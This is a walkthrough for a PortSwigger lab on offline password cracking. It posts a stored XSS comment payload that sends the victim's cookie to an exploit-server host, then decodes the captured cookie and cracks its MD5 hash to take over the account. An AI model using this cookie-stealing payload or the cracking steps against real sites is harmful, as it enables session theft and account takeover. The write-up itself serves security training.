# Lab-10: [Offline password cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)

This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality.

**Aim :-** To solve the lab, obtain Carlos's ``` stay-logged-in ``` cookie and use it to crack his password. Then, log in as ``` carlos ``` and delete his account from the "My account" page. 

   - Your credentials: ``` wiener:peter ```.
   - Victim's username: ``` carlos ```.



## Solution
- Login as ``` wiener ```.
    - Username : ``` wiener ```.
    - Password : ``` peter ```.

- After login there will be a ``` stay-logged-in ``` cookie.

- The cookie is in the format of ``` username:MD5-hashed-password ``` which is encoded using **base64** format.

- Go to **Exploit server** and copy the **URL**.

- Replace the **URL** in the following payload and post it as a comment in a random post.
```javascript
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

- From the **Exploit server** open **Access log**.

- If the user ``` carlos ``` visited that post then there will be a ``` GET ``` request with ``` stay-logged-in ``` cookie of user ``` carlos ```.

- Copy that **base64** cookie and decode it.
    - Decoded cookie will look like : ``` carlos:MD5-hashed-password ```.

- Copy the hash value find the plain text ( Use [Crack Station](https://crackstation.net/) or any other tools ).

- Copy the password and login as ``` carlos ```.

- Delete account.